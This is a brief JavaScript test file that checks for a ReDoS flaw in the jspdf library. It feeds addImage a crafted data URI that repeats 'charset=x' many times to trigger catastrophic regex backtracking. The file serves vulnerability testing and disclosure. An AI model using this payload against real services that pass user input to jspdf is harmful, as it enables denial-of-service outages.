const { expectRedos } = require("../utils");

test("ReDos in jspdf", () => {
  const { jsPDF } = require("jspdf");
  const doc = new jsPDF();
  doc.text("Hello world", 10, 10);
  expectRedos({
    run: (input) => {
      try {
        doc.addImage(input, "JPEG", 1, 2);
      } catch (e) {}
    },
    build: (n) => "data:image/jpeg;" + "charset=x".repeat(n) + "!base64,",
    n: 25,
  });
});
